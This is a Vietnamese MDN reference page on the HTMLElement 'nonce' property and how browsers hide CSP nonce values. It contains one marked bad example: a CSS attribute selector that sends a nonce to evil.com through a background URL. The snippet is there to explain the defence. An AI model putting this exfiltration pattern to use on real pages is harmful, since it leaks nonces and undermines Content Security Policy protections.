---
title: "HTMLElement: thuộc tính nonce"
short-title: nonce
slug: Web/API/HTMLElement/nonce
page-type: web-api-instance-property
browser-compat: api.HTMLElement.nonce
---

{{APIRef("HTML DOM")}}

Thuộc tính **`nonce`** của giao diện {{DOMxRef("HTMLElement")}} trả về số mật mã dùng một lần được [Chính sách bảo mật nội dung](/en-US/docs/Web/HTTP/Guides/CSP) sử dụng để xác định xem một lần tải có được phép tiến hành hay không.

Trong các triển khai mới hơn, các phần tử chỉ hiển thị thuộc tính `nonce` của mình cho các tập lệnh (không phải cho các kênh phụ như bộ chọn thuộc tính CSS).

## Ví dụ

### Lấy giá trị nonce

Trước đây, không phải tất cả các trình duyệt đều hỗ trợ thuộc tính IDL `nonce`, vì vậy có thể dùng [`getAttribute`](/en-US/docs/Web/API/Element/getAttribute) như một phương án dự phòng:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

Tuy nhiên, các phiên bản trình duyệt gần đây ẩn các giá trị `nonce` được truy cập theo cách này (sẽ trả về chuỗi rỗng). Thuộc tính IDL (`script['nonce']`) sẽ là cách duy nhất để truy cập nonce.

Việc ẩn nonce giúp ngăn kẻ tấn công lấy cắp dữ liệu nonce thông qua các cơ chế có thể lấy dữ liệu từ các thuộc tính nội dung như bộ chọn CSS này:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Thông số kỹ thuật

{{Specifications}}

## Tương thích trình duyệt

{{Compat}}

## Xem thêm

- [Thuộc tính toàn cục `nonce`](/en-US/docs/Web/HTML/Reference/Global_attributes/nonce)
- [Chính sách bảo mật nội dung](/en-US/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
